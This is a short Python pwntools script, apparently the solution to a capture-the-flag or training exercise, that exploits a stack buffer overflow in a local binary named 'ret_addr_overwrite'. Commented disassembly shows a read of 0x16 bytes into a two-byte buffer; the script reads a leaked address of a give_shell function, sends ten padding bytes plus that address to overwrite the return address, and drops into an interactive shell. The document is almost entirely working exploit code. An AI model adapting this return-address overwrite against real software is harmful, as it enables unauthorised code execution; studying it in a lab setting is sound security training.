from pwn import *
context.arch = "amd64"

#   0x0000000000400716 <+0>:	push   rbp
#   0x0000000000400717 <+1>:	mov    rbp,rsp
#   0x000000000040071a <+4>:	sub    rsp,0x10
#   0x000000000040071e <+8>:	lea    rax,[rbp-0x2]
#   0x0000000000400722 <+12>:	mov    edx,0x16
#   0x0000000000400727 <+17>:	mov    rsi,rax
#   0x000000000040072a <+20>:	mov    edi,0x0
#   0x000000000040072f <+25>:	call   0x4005f0 <read@plt>
#   0x0000000000400734 <+30>:	nop
#   0x0000000000400735 <+31>:	leave
#   0x0000000000400736 <+32>:	ret

program = process('./ret_addr_overwrite')

give_shell_addr = program.readuntil(b'\n')
give_shell_addr = int(give_shell_addr, 16)

payload = (b'A' * 2) + (b'A' * 8) + p64(give_shell_addr)
print(payload)
program.send_raw(payload)
program.interactive()
